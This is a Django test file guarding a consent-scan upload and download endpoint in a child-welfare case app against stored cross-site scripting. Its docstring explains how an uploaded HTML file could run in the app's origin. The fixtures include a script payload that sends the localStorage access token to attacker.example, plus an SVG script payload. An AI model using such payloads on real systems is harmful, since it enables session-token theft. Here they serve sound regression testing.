"""A consent scan is a picture of signed paper, and nothing else.

This field was the one upload in the API with no type check, and it is also
the only one served back inline — the frontend previews it in an iframe from a
blob: URL, and a blob inherits the app's own origin. An .html accepted here
therefore ran as the application for whoever opened the preview next, with
`localStorage` and the tokens in it. The attacker had to be a signed-in
psychologist writing a consent for their own assigned child, which is an
ordinary thing for them to do; the victim was whoever reviewed it, most
plausibly an administrator.

Two locks, tested separately on purpose. The upload refuses the file, and the
download refuses to render it — because rows uploaded before the first lock
existed are still in storage, and the fix has to cover them too.
"""
import tempfile

from django.contrib.auth import get_user_model
from django.core.files.uploadedfile import SimpleUploadedFile
from django.test import override_settings
from rest_framework.test import APITestCase

from accounts.models import Role
from children.models import Child
from clinical.models import ConsentRecord

TEMP_MEDIA = tempfile.mkdtemp(prefix="nacc-consent-test-")
User = get_user_model()

SCRIPT = b"<script>fetch('https://attacker.example/?t='+localStorage.access)</script>"


@override_settings(MEDIA_ROOT=TEMP_MEDIA)
class ConsentScanUploadTest(APITestCase):
    def setUp(self):
        Role.objects.create(role_name=Role.ADMINISTRATOR)
        Role.objects.create(role_name=Role.STAFF)
        self.psy_role = Role.objects.create(role_name=Role.PSYCHOLOGIST)
        self.psy = User.objects.create_user(
            email="p@racco1.gov.ph", username="p", password="pass1234",
            role=self.psy_role)
        self.child = Child.objects.create(
            fullname="Ana", case_type="Adoption", assigned_psychologist=self.psy)
        token = self.client.post("/api/auth/login/", {
            "email": "p@racco1.gov.ph", "password": "pass1234"}).data["access"]
        self.client.credentials(HTTP_AUTHORIZATION="Bearer " + token)

    def _upload(self, filename, body=b"%PDF-1.4", content_type="application/pdf"):
        return self.client.post("/api/consents/", {
            "child": self.child.id,
            "signer_name": "Maria Santos",
            "signer_relationship": "Guardian",
            "scan": SimpleUploadedFile(filename, body, content_type=content_type),
        }, format="multipart")

    # ---- lock one: the upload --------------------------------------------

    def test_an_html_scan_is_refused(self):
        resp = self._upload("evil.html", SCRIPT, "text/html")
        self.assertEqual(resp.status_code, 400, resp.data)
        self.assertFalse(ConsentRecord.objects.exists())

    def test_an_svg_scan_is_refused(self):
        """SVG renders as a document and can carry script, so it is not an
        image for this purpose however much the extension suggests it."""
        resp = self._upload("evil.svg", b"<svg xmlns='http://www.w3.org/2000/svg'>"
                                        b"<script>alert(1)</script></svg>", "image/svg+xml")
        self.assertEqual(resp.status_code, 400, resp.data)

    def test_a_pdf_and_a_photo_are_accepted(self):
        for name, ctype in (("consent.pdf", "application/pdf"),
                            ("consent.jpg", "image/jpeg"),
                            ("consent.HEIC", "image/heic")):
            with self.subTest(name=name):
                resp = self._upload(name, b"data", ctype)
                self.assertEqual(resp.status_code, 201, resp.data)

    # ---- lock two: the download ------------------------------------------

    def test_a_scan_already_in_storage_is_never_served_as_html(self):
        """The rows that predate the upload check. Written straight to the
        model, the way one uploaded before the fix would already exist."""
        record = ConsentRecord.objects.create(
            child=self.child, recorded_by=self.psy, signer_name="X",
            scan=SimpleUploadedFile("evil.html", SCRIPT, content_type="text/html"))

        resp = self.client.get(f"/api/consents/{record.id}/download/")
        self.assertEqual(resp.status_code, 200)
        self.assertNotIn("text/html", resp.headers.get("Content-Type", ""),
                         "the browser would render this in the preview iframe")
        self.assertIn("attachment", resp.headers.get("Content-Disposition", ""),
                      "anything not previewable must download, not display")
        self.assertEqual(resp.headers.get("X-Content-Type-Options"), "nosniff")

    def test_a_pdf_still_previews_inline(self):
        """The fix must not break the thing the endpoint is for."""
        record = ConsentRecord.objects.create(
            child=self.child, recorded_by=self.psy, signer_name="X",
            scan=SimpleUploadedFile("consent.pdf", b"%PDF-1.4", content_type="application/pdf"))

        resp = self.client.get(f"/api/consents/{record.id}/download/")
        self.assertEqual(resp.status_code, 200)
        self.assertEqual(resp.headers.get("Content-Type"), "application/pdf")
        self.assertIn("inline", resp.headers.get("Content-Disposition", ""))

    def test_an_image_still_previews_inline(self):
        record = ConsentRecord.objects.create(
            child=self.child, recorded_by=self.psy, signer_name="X",
            scan=SimpleUploadedFile("scan.jpg", b"\xff\xd8\xff", content_type="image/jpeg"))

        resp = self.client.get(f"/api/consents/{record.id}/download/")
        self.assertEqual(resp.headers.get("Content-Type"), "image/jpeg")
        self.assertIn("inline", resp.headers.get("Content-Disposition", ""))
